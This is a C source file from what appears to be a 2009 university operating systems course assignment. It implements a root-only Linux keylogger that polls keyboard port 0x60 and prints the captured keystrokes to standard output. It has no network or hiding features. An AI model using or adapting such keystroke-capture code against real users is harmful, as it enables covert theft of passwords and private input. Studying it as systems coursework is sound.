/* SSC141 - Sistemas Operacionais II
 * Arquivo: usplogger.c
 *
 * Data: 23/09/2009
 * Trabalho desenvolvido pelos alunos (grupo A8):
 *
 * Ubiratan Soares
 * Ulisses Soares
 * Vinicius Grippa
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/io.h>
#include <string.h>
#include <time.h>

#include "mapping.h"

#define KEYBOARD_PORT		0x60
#define LEFT_SHIFT		42
#define RIGHT_SHIFT		54
#define ALT			56
#define TIMEOUT			10000
#define DELAYTIME 50000
#define ROOT_UID	 	0

void checkuser(void);
void adjustpermissions(void);
void scankeyboard(FILE *output);

FILE *output;

int main(int argc, char **argv)
{
	// Checando se o usuário executa esse programa como root
	checkuser();

	// Ajustando as permissões de leitura de portas
	adjustpermissions();

	// Keylogging será exibido na sadia padrao, podendo ser remanejado conforme interesse
	output = stdout;

	// Loop principal
	scankeyboard(output);

	return 0;
}

void checkuser(void) {
	
	if (getuid() != ROOT_UID) {
		fprintf(stderr, "\nYOU MUST BE ROOT TO RUN THIS PROGRAM !\n");
		exit(0);
	}
} //end checkuser

void adjustpermissions(void){

	// System Call - ioperm
	// ioperm(portbase,range,mode)
	// ioperm precisa de priveligios de superusuario

	if (ioperm(KEYBOARD_PORT, 1, 1) == -1){	
		fprintf(stderr, "%s\n", strerror(errno));
		exit(1);
	}	

} //end adjustpermissions

void scankeyboard(FILE *output){

	unsigned char c;	// Byte lido da porta
	unsigned int shift_down = 0;	// Flag auxiliar para identificar se algum shift esta pressionado
	static unsigned char key_pressed[128] = {0};	// Vetor auxiliar para indicar se a tecla está pressionada

	while(1){
				
		// Para ler a porta, utilizamos a funcao de leitura com delay
		c = inb(KEYBOARD_PORT);

		if (c == 0) continue;

		if (c < 128) {
			
			// Uma tecla foi pressionada
			
			if (!key_pressed[c]) {

				// Marcando se SHIFT  foi pressionado
				if (c == LEFT_SHIFT || c == RIGHT_SHIFT) shift_down = 1;
				
				// Mapeamento de acordo com o status de SHIFT	
				keymapp(output, c, shift_down);
			}
			
			// Marcamos que a tecla esta pressionada
			key_pressed[c] = 1;
			
		} else {
			
			//  Uma tecla foi liberada
			// Limpamos a posicao no vetor auxiliar e setamos o flag para os SHIFTS se necessario
			
			key_pressed[c & 127] = 0;

			if (!key_pressed[LEFT_SHIFT] && !key_pressed[RIGHT_SHIFT]) shift_down = 0;

			}

		// Bloqueamos o processo por algum tempo enquanto nao havera uma nova tecla pressionada
		usleep(DELAYTIME);

	} //end while

} //end scankbd


